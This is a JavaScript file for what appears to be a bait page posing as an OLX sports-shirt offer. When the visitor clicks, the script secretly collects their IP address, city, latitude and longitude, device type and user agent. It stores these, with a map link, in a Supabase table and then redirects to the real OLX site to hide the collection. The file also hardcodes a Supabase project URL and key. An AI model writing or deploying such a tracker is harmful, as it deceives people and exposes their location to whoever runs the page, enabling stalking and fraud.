// Conexão com o Supabase
const SUPABASE_URL = "https://dpfqhkjnirudtxuivhcg.supabase.co";
const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRwZnFoa2puaXJ1ZHR4dWl2aGNnIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTMwMDg1ODYsImV4cCI6MjA2ODU4NDU4Nn0.5NrF4nArELAGAkwjLOQNCdq-p1TLUIhZRN4XtZiJ7DI";

// Inicializa o cliente
const { createClient } = supabase;
const supabaseClient = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

document.addEventListener("DOMContentLoaded", () => {
    const btn = document.getElementById("btn-ver-oferta");

    btn.addEventListener("click", async () => {
        try {
            // Obter IP e geolocalização
            const ipRes = await fetch("https://ipapi.co/json/");
            const ipData = await ipRes.json();

            // Detectar tipo de aparelho
            const userAgent = navigator.userAgent;
            let aparelho = "Desconhecido";
            if (/Mobi|Android/i.test(userAgent)) {
                aparelho = "Celular";
            } else if (/iPad|Tablet/i.test(userAgent)) {
                aparelho = "Tablet";
            } else {
                aparelho = "Computador";
            }

            // Dados
            const titulo = "Camisa esportiva OLX";
            const url_isca = window.location.href;
            const redirecionamento = "https://www.olx.com.br";
            const data_hora = new Date().toISOString();
            const geolocalizacao = `${ipData.city} - ${ipData.region_code}`;
            const latitude = ipData.latitude;
            const longitude = ipData.longitude;
            const mapa_link = `https://maps.google.com/maps?q=${latitude},${longitude}&z=14&output=embed`;

            const payload = {
                titulo,
                url_isca,
                redirecionamento,
                ip: ipData.ip,
                navegador: userAgent,
                geolocalizacao,
                aparelho,
                data_hora,
                latitude: latitude.toString(),
                longitude: longitude.toString(),
                mapa_link
                // acessos será 1 por default na tabela
            };

            // Enviar ao Supabase
            const { error } = await supabaseClient.from("coleta_olx").insert([payload]);

            if (error) {
                console.error("Erro ao salvar no Supabase:", error);
            } else {
                console.log("Dados enviados com sucesso:", payload);
            }

            // Redirecionar para OLX
            window.location.href = redirecionamento;

        } catch (err) {
            console.error("Erro geral na coleta:", err);
            window.location.href = "https://www.olx.com.br";
        }
    });
});
